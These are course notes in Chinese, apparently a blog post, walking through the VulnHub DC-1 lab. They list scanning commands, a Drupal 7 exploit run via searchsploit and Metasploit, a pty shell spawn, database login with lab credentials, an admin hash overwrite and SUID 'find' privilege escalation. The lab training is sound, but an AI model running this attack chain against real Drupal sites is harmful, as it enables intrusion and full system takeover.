---
title: "VulnHub DC-1 靶机实战：从 Drupal 7 到 root"
date: 2026-10-19T10:00:00+08:00
draft: false
categories: ["课程笔记", "靶机实战"]
tags: ["Linux", "靶机", "渗透", "课程笔记"]
summary: "网段扫描与全端口探测、Apache 2.2.22 + Drupal 7 的指纹识别、敏感目录与后台入口、拿到 root 并读取 /etc/shadow 的完整路径。"
description: "网段扫描与全端口探测、Apache 2.2.22 + Drupal 7 的指纹识别、敏感目录与后台入口、拿到 root 并读取 /etc/shadow 的完整路径。"
ShowToc: true
---

> 来源：Linux 服务基础课程讲义（`dc-1.pdf`，共 9 页）。由 PDF 转为 Markdown 并抽取原文图片，仅整理排版与章节层级，正文内容未改写。

IP不知、账户密码不知、最终获取到root权限（cd /root  cat /etc/shaodow）虚拟机全部桥接nat模式（kali 会有一些在线工具）

证书提交要点：

未授权rce命令执行  （声明：不需要账号密码即可rce）

登录后的rce执行（前提：一定要在文档中写上账号密码）

访问本地搭建的固件环境

1、录屏打开浏览器，输入IP访问成功

2、BP IDA 命令注入~  信息收集

  - ！网段扫描

  - @  sudo nmap -sP 192.168.133.0/24

![VulnHub DC-1 靶机实战 示意图 1](/images/linux-notes/vulnhub-dc-1/img-01.webp)

  - @ 全面扫描指定IP

  - nmap -A  -p- 192.168.133.134

  - (一定不能扫描公网IP，生成大量的请求数据，IDS)

![VulnHub DC-1 靶机实战 示意图 2](/images/linux-notes/vulnhub-dc-1/img-02.webp)

  - @  apache 2.2.22      web服务

  - @  drupal  7               cms的框架

  - ~  铭感目录扫描

  - ！后台账号登录目录....

  - ！dirb

  - ！robots.txt文件

~ 搜索相关的漏洞

  - searchsploit  (kali系统里面的漏洞库)

  - ！apache2.2.22

  - ！drupal 7

![VulnHub DC-1 靶机实战 示意图 3](/images/linux-notes/vulnhub-dc-1/img-03.webp)

  - @searchsploit -m 34992

![VulnHub DC-1 靶机实战 示意图 4](/images/linux-notes/vulnhub-dc-1/img-04.webp)

![VulnHub DC-1 靶机实战 示意图 5](/images/linux-notes/vulnhub-dc-1/img-05.webp)

  - ！尝试创建管理员账号

  - python2 34992.py -t http://192.168.133.134 -u tom -p 123456

![VulnHub DC-1 靶机实战 示意图 6](/images/linux-notes/vulnhub-dc-1/img-06.webp)

暂停~ 获取系统权限！方法一：

  - @dc-1  rce

  - @which nc 查看对方系统是否有nc命令

！方法二：

  - @msfconsole

![VulnHub DC-1 靶机实战 示意图 7](/images/linux-notes/vulnhub-dc-1/img-07.webp)

  - @msf > search drupal 7

![VulnHub DC-1 靶机实战 示意图 8](/images/linux-notes/vulnhub-dc-1/img-08.webp)

  - @use 1  （选择模块）

  - @show options (查看模块配置)

![VulnHub DC-1 靶机实战 示意图 9](/images/linux-notes/vulnhub-dc-1/img-09.webp)

  - @run 开始攻击

meterpreter >   平台的shell

  - shell 调用对方的命令解释器

  - @通过python 调取一个子bash，显示正常

  - python -c "import pty;pty.spawn('/bin/bash')"

  - ! 查看配置文件

  - @/var/www/sites/default$ cat settings.php

![VulnHub DC-1 靶机实战 示意图 10](/images/linux-notes/vulnhub-dc-1/img-10.webp)

  - ！登录数据库

  - mysql -u dbuser -pR0ck3t

![VulnHub DC-1 靶机实战 示意图 11](/images/linux-notes/vulnhub-dc-1/img-11.webp)

  - @查找drupal自带的密码生成脚本

![VulnHub DC-1 靶机实战 示意图 12](/images/linux-notes/vulnhub-dc-1/img-12.webp)

  - hash: $S$DL74aPmGjcBH8wH/tThUeD2guiePqM/6Xb8NkjzdJ4/AurGkqsmx@替换admin的密码

  - update drupaldb.users set

pass="$S$DL74aPmGjcBH8wH/tThUeD2guiePqM/6Xb8NkjzdJ4/AurGkqsmx" where uid=1;

~ flag3提示查找系统中哪些命令具有suid

  - ！ find / -perm -u=s 2>/dev/null

  - @find提权

  - find / -exec /bin/sh  \;

flag1.txt Every good CMS needs a config file - and so do you.

  - flag2

  - Brute force and dictionary attacks aren't the

  - only ways to gain access (and you WILL need access).

  - What can you do with these credentials?

flag3 Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.flag4 Can you use this same method to find or access the flag in root?Probably. But perhaps it's not that easy.  Or maybe it is?
